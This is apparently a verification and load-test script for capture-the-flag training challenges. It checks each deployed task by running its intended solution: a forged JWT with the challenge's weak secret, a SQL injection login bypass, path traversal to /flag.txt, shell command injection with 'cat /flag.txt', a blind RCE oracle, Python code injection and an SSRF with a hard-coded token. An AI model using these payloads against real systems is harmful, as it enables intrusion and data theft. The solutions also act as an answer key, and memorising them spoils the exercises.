"""Functional checks, persistence checks and a bounded two-client HTTP load check."""
import argparse
import base64
from concurrent.futures import ThreadPoolExecutor
import hashlib
import hmac
from http.cookiejar import CookieJar
import json
from pathlib import Path
import re
import secrets
import time
import urllib.parse
import urllib.request

HERE=Path(__file__).resolve().parent
META=json.loads((HERE/'release.json').read_text())


class Client:
    def __init__(self,base):
        self.base=base
        self.opener=urllib.request.build_opener(urllib.request.ProxyHandler({}),
            urllib.request.HTTPCookieProcessor(CookieJar()))

    def request(self,path='/',method='GET',data=None,headers=None):
        request=urllib.request.Request(self.base+path,data=data,headers=headers or {},method=method)
        with self.opener.open(request,timeout=10) as response:
            assert response.status==200,(path,response.status)
            return response.read()

    def form(self,path,values):
        return self.request(path,'POST',urllib.parse.urlencode(values).encode(),
                            {'Content-Type':'application/x-www-form-urlencoded'})

    def json(self,path,values,method='POST',headers=None):
        hdr={'Content-Type':'application/json',**(headers or {})}
        return self.request(path,method,json.dumps(values).encode(),hdr)


def functional(host,persistence=False):
    fixture=HERE/'verification-fixture.json'
    credentials=json.loads(fixture.read_text()) if persistence else {
        'username':'deploy_'+secrets.token_hex(5),'password':secrets.token_hex(8),
        'filename':'deploy-check.txt','content':'persistent-'+secrets.token_hex(8)}
    for task in META['tasks']:
        name=task['name']; expected=task['flag'].encode()
        c=Client(f"http://{host}:{task['port']}")
        page=c.request()
        assert page and b'<html' in page.lower(),name
        for link in set(re.findall(rb'(?:src|href)=["\'](/static/[^"\']+)',page)):
            assert c.request(link.decode()),(name,link)
        if name!='blind-rce':
            assert b'ready' in c.request('/healthz'),name
        if name=='headers':
            assert expected in c.json('/give_me_my_flag',{'flags?':[
                'trying to get flag 1 time','trying to get flag 2 time']},'FLAG',
                {'Flag-Header':'I-am-real-flag-owner'}),name
        elif name=='jwt':
            c.form('/register',credentials)
            c.form('/login',credentials)
            assert expected not in c.request('/flag')
            encode=lambda b:base64.urlsafe_b64encode(b).rstrip(b'=')
            payload=encode(b'{"alg":"HS256","typ":"JWT"}')+b'.'+encode(b'{"username":"admin"}')
            token=payload+b'.'+encode(hmac.new(b'omg_is_it_a_secret?',payload,hashlib.sha256).digest())
            assert expected in Client(c.base).request('/flag',headers={'Cookie':'flag_token='+token.decode()}),name
        elif name=='sql-injection':
            if not persistence:
                c.form('/register',credentials)
            page=c.form('/login',credentials)
            assert b'/logout' in page,(name,'ordinary login')
            c=Client(c.base)
            page=c.form('/login',{'username':"' OR username='robert' -- ",'password':'test'})
            assert expected in page,(name,'SQL solution')
        elif name=='path-traversal':
            if not persistence:
                c.form('/register',credentials)
            c.form('/login',credentials)
            assert c.request('/download?filename=burger.jpg').startswith(b'\xff\xd8')
            if not persistence:
                boundary='deploy'+secrets.token_hex(8)
                body=(f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
                      f'filename="{credentials["filename"]}"\r\nContent-Type: text/plain\r\n\r\n'
                      f'{credentials["content"]}\r\n--{boundary}--\r\n').encode()
                c.request('/upload','POST',body,{'Content-Type':'multipart/form-data; boundary='+boundary})
            assert c.request('/download?filename='+credentials['filename']).decode()==credentials['content']
            assert expected in c.request('/download?filename=%2Fflag.txt'),name
        elif name=='command-injection':
            normal=json.loads(c.json('/api/pinger',{'ip':'127.0.0.1'}))['message']
            assert '127.0.0.1' in normal and 'packets' in normal,(name,'ping output',normal)
            assert expected in c.json('/api/pinger',{'ip':'127.0.0.1 -c 1; cat /flag.txt #'}),name
        elif name=='blind-rce':
            assert json.loads(c.json('/api/pinger',{'ip':'127.0.0.1'}))['message']=='bebebe pinged'
            payload='127.0.0.1 -c 1; [ "$FLAG" = "'+task['flag']+'" ] && echo x >&2 #'
            result=c.json('/api/pinger',{'ip':payload})
            assert json.loads(result)['message']=='bebebe error' and expected not in result,name
            false=c.json('/api/pinger',{'ip':payload.replace(task['flag'],'definitely-wrong')})
            assert json.loads(false)['message']=='bebebe pinged',name
        elif name=='code-injection':
            assert json.loads(c.json('/api/calculate',{'sign':'2+3'}))['message']==5
            assert expected in c.json('/api/calculate',{'sign':"open('/flag.txt').read()"}),name
        elif name=='ssrf':
            assert b'sample-site' in c.json('/api/send',{'url':'http://ssrf-sample:8080/'})
            assert expected not in c.json('/api/send',{'url':'http://ssrf-internal:1337/flag'})
            assert expected in c.json('/api/send',{'url':'http://ssrf-internal:1337/flag',
                'headers':{'Authorization':'Bearer MireactfG00000000l'}}),name
        print('PASS',name, 'persistence' if persistence else 'functional',flush=True)
    if not persistence:
        fixture.write_text(json.dumps(credentials,indent=2))


def load(host,seconds):
    urls=[f"http://{host}:{t['port']}/" for t in META['tasks']]
    urls += [f'http://{host}/',f'http://{host}:13371/',f'http://{host}:13372/']
    until=time.monotonic()+seconds
    def worker(offset):
        results=[]; i=offset
        opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
        while time.monotonic()<until:
            start=time.monotonic(); url=urls[i%len(urls)]; i+=2
            try:
                with opener.open(url,timeout=10) as r:
                    r.read(); assert r.status==200
                results.append({'ok':True,'seconds':time.monotonic()-start})
            except Exception as error:
                results.append({'ok':False,'url':url,'error':str(error)})
            time.sleep(max(0,2-(time.monotonic()-start)))
        return results
    with ThreadPoolExecutor(max_workers=2) as pool:
        futures=[pool.submit(worker,i) for i in (0,1)]
        samples=[s for f in futures for s in f.result()]
    errors=[s for s in samples if not s['ok']]
    durations=sorted(s['seconds'] for s in samples if s['ok'])
    result={'duration_seconds':seconds,'clients':2,'requests':len(samples),'errors':errors,
            'p95_seconds':durations[min(len(durations)-1,int(len(durations)*.95))] if durations else None}
    (HERE/'load-result.json').write_text(json.dumps(result,indent=2))
    print(json.dumps(result,indent=2),flush=True)
    assert not errors,'Load check failed'


if __name__=='__main__':
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--host',default='learn.kb2ctf.ru')
    parser.add_argument('--persistence',action='store_true')
    parser.add_argument('--load',type=int,default=0,metavar='SECONDS')
    args=parser.parse_args()
    if args.load:
        load(args.host,args.load)
    else:
        functional(args.host,args.persistence)
